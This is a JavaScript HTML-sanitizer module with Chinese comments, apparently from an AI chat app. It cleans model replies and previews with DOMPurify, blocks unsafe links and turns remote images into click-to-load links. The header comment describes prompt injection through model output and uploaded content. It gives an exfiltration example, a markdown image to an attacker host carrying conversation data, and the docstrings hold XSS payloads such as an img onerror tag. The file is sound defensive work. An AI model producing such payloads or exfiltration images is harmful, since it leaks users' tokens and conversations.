// HTML 消毒：markdown 渲染产物、第三方预览库生成的 HTML 进入 v-html / DOM 前的最后一道关。
//
// 模型回复、知识库文档、联网搜索结果、上传文件都可能被提示注入，而 marked 不做任何过滤：
// 原始 HTML（<img onerror>、<script>）与 javascript: 链接会原样进入 v-html，在本站上下文里
// 执行脚本，读走 localStorage 里的登录 token。这里用 DOMPurify 按白名单清洗。
//
// 另外两条（2026-11-06）：
// - 链接只保留 http(s) / mailto / tel：相对地址、页内锚点在本页跳转会离开对话（流式输出中断、
//   内网宿主页面被替换），去掉 href 只留文字；网页链接一律新标签页打开。
// - remoteImages: 'link'（对话正文用）：外站图片不自动加载，改成「图片：说明（域名）」链接，点开才请求。
//   被注入的模型只要输出 ![](https://攻击者/?d=对话内容)，浏览器渲染时就会把数据发出去；
//   音视频、srcset、带 url() 的内联样式同理，一并去掉。文件预览传 'inline' 保持原样。
//
// 约定：
// - 用独立的 DOMPurify 实例（首次调用时按当前 window 创建）：hook 与配置不影响宿主自己的 DOMPurify；
// - 没有 DOM 的环境（Node 单测、构建脚本）原样返回——那里没有注入点；有 DOM 但 DOMPurify
//   不可用时整段转义，宁可显示源码也不放行。
import DOMPurify from 'dompurify'

/** 代码块复制按钮的内联处理函数：渲染器写死这个值，消毒时按「标签 + 类名 + 完整取值」精确放行 */
export const CODE_COPY_ONCLICK = 'copyCode(this)'

const PURIFY_CONFIG = {
  // 外链在新标签页打开：DOMPurify 默认剥掉 target，这里放行，再由 hook 统一补 noopener
  ADD_ATTR: ['target'],
  // <style> 能改整页样式（盖住界面、伪造登录框），<form> 能把输入提交到任意地址；正文渲染用不到
  FORBID_TAGS: ['style', 'form'],
  // KaTeX 的 MathML 里 <annotation> 存的是 TeX 源码，DOMPurify 默认会拆掉标签却留下文字，
  // 读屏会把公式再念一遍源码：连内容一起去掉（公式的可视部分与 MathML 结构不受影响）
  ADD_FORBID_CONTENTS: ['annotation'],
}

/** remoteImages: 'link' 时额外去掉的、会自动请求外部资源的标签与属性（<img> 另行改成链接） */
const NO_REMOTE_CONFIG = {
  ...PURIFY_CONFIG,
  FORBID_TAGS: [...PURIFY_CONFIG.FORBID_TAGS, 'audio', 'video', 'source', 'track', 'picture', 'image'],
  FORBID_ATTR: ['srcset', 'poster', 'background'],
}

/** 内联样式里能发请求的写法（KaTeX 的定位样式不会命中；反斜杠用于 CSS 转义绕过） */
const REMOTE_STYLE = /url\s*\(|image-set|image\s*\(|cross-fade|element\s*\(|\\/i

/** 外站图片挪到这个属性上（src 去掉就不会请求），消毒后再改写成链接 */
const REMOTE_SRC_ATTR = 'data-remote-src'

const SAFE_LINK_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:'])

const purifiers = new WeakMap()

function keepCodeCopyHandler(node, data) {
  if (
    data.attrName === 'onclick' &&
    data.attrValue === CODE_COPY_ONCLICK &&
    node.nodeName === 'BUTTON' &&
    node.classList.contains('code-copy-btn')
  ) {
    // 模型伪造同样的按钮也只能触发复制，拿不到任意脚本执行；其余 on* 属性照常剥掉
    data.forceKeepAttr = true
  }
}

function forceSafeTarget(node) {
  if (!node.hasAttribute || !node.hasAttribute('target')) return
  // 任何 target 都改成新标签页并断开 opener，防止被打开的页面反过来改写本页地址
  node.setAttribute('target', '_blank')
  node.setAttribute('rel', 'noopener noreferrer')
}

/** 链接只认 http(s)（新标签页打开）与 mailto / tel；其余地址在本页跳转会离开对话，去掉 href 只留文字 */
function enforceLinkPolicy(node) {
  if (node.nodeName !== 'A' || !node.hasAttribute('href')) return
  const href = node.getAttribute('href').trim()
  if (/^(?:https?:)?\/\//i.test(href)) {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  } else if (!/^(?:mailto|tel):/i.test(href)) {
    node.removeAttribute('href')
    node.removeAttribute('target')
  }
}

/** 判断地址是否指向外站 http(s)（相对地址、本站地址、data: 不算） */
function remoteUrlChecker(win) {
  const here = win.location && /^https?:/i.test(win.location.href) ? win.location.href : 'https://easy-agent.invalid/'
  const origin = new URL(here).origin
  return (value) => {
    try {
      const url = new URL(String(value || '').trim(), here)
      return /^https?:$/.test(url.protocol) && url.origin !== origin
    } catch (e) {
      return false
    }
  }
}

function createPurifier(win, config, blockRemote) {
  const purifier = DOMPurify(win)
  if (!purifier.isSupported) return purifier
  purifier.setConfig(config)
  const isRemote = blockRemote ? remoteUrlChecker(win) : null
  purifier.addHook('uponSanitizeAttribute', (node, data) => {
    keepCodeCopyHandler(node, data)
    if (blockRemote && data.attrName === 'style' && REMOTE_STYLE.test(data.attrValue)) data.keepAttr = false
  })
  purifier.addHook('afterSanitizeAttributes', (node) => {
    forceSafeTarget(node)
    enforceLinkPolicy(node)
    if (blockRemote && node.nodeName === 'IMG' && node.hasAttribute('src') && isRemote(node.getAttribute('src'))) {
      node.setAttribute(REMOTE_SRC_ATTR, node.getAttribute('src'))
      node.removeAttribute('src')
    }
  })
  return purifier
}

function purifierFor(win, blockRemote) {
  if (!win || !win.document) return null
  let pair = purifiers.get(win)
  if (!pair) {
    pair = {}
    purifiers.set(win, pair)
  }
  const key = blockRemote ? 'noRemote' : 'default'
  if (!pair[key]) pair[key] = createPurifier(win, blockRemote ? NO_REMOTE_CONFIG : PURIFY_CONFIG, blockRemote)
  return pair[key]
}

function hostOf(url) {
  try {
    return new URL(url).host
  } catch (e) {
    return url
  }
}

/** 已消毒 HTML 里被挪走 src 的外站图片改写成链接（在不加载资源的独立文档里改，不碰页面 DOM） */
function remoteImagesToLinks(html, win) {
  if (html.indexOf(REMOTE_SRC_ATTR) === -1) return html
  const doc = win.document.implementation.createHTMLDocument('')
  doc.body.innerHTML = html
  for (const img of doc.body.querySelectorAll(`img[${REMOTE_SRC_ATTR}]`)) {
    const src = img.getAttribute(REMOTE_SRC_ATTR)
    const alt = (img.getAttribute('alt') || '').trim()
    const link = doc.createElement('a')
    link.className = 'md-image-link'
    link.setAttribute('href', src)
    link.setAttribute('target', '_blank')
    link.setAttribute('rel', 'noopener noreferrer')
    link.setAttribute('title', '外部图片，点击在新标签页查看：' + src)
    link.textContent = alt ? `图片：${alt}（${hostOf(src)}）` : `图片（${hostOf(src)}）`
    img.replaceWith(link)
  }
  return doc.body.innerHTML
}

function escapeAll(text) {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
}

/**
 * 清洗一段准备交给 v-html 的 HTML：去掉脚本、事件属性、危险协议链接、<style> / <form>，
 * 保留渲染器产出的结构（代码块外壳与复制按钮、来源卡片、知识依据锚点、KaTeX、emoji）。
 *
 * @param {string} html 待清洗的 HTML
 * @param {{ remoteImages?: 'inline' | 'link' }} [options] remoteImages: 'link' 时外站图片改成链接、
 *   不自动加载（对话正文）；默认 'inline' 原样保留（文件预览、表格兜底等）
 * @returns {string} 可以安全交给 v-html 的 HTML
 * @example
 * sanitizeHtml('<img src=x onerror="alert(1)">') // '<img src="x">'
 * sanitizeHtml('<img src="https://e.example/a.png">', { remoteImages: 'link' }) // '<a class="md-image-link" …>图片（e.example）</a>'
 */
export function sanitizeHtml(html, options = {}) {
  if (!html) return ''
  const win = typeof window === 'undefined' ? null : window
  const blockRemote = options.remoteImages === 'link'
  const purifier = purifierFor(win, blockRemote)
  if (!purifier) return String(html)
  if (!purifier.isSupported) return escapeAll(html)
  const clean = purifier.sanitize(String(html))
  return blockRemote ? remoteImagesToLinks(clean, win) : clean
}

/**
 * 链接地址是否可以保留：只认 http(s) / mailto / tel 与站内相对地址，javascript: / data: 等一律不要。
 *
 * @param {string} href 链接地址（getAttribute 读到的原始值）
 * @returns {boolean} 是否安全
 * @example
 * isSafeLinkUrl('java\tscript:alert(1)') // false（URL 解析会去掉制表符）
 */
export function isSafeLinkUrl(href) {
  const value = String(href == null ? '' : href).trim()
  if (!value) return true
  try {
    // 相对地址按 https 页面解析：只判断协议，不关心具体站点
    return SAFE_LINK_PROTOCOLS.has(new URL(value, 'https://easy-agent.invalid/').protocol)
  } catch (e) {
    return false
  }
}

/**
 * 第三方预览库（docx-preview 等）直接生成 DOM、不经过 sanitizeHtml：渲染完成后去掉其中
 * 不安全链接的 href（链接文字保留），避免点一下就执行脚本。
 *
 * @param {Element|null} root 渲染容器
 * @returns {number} 被去掉 href 的链接数
 */
export function neutralizeUnsafeLinks(root) {
  if (!root || typeof root.querySelectorAll !== 'function') return 0
  let count = 0
  for (const link of root.querySelectorAll('a[href], area[href]')) {
    if (isSafeLinkUrl(link.getAttribute('href'))) continue
    link.removeAttribute('href')
    count++
  }
  return count
}
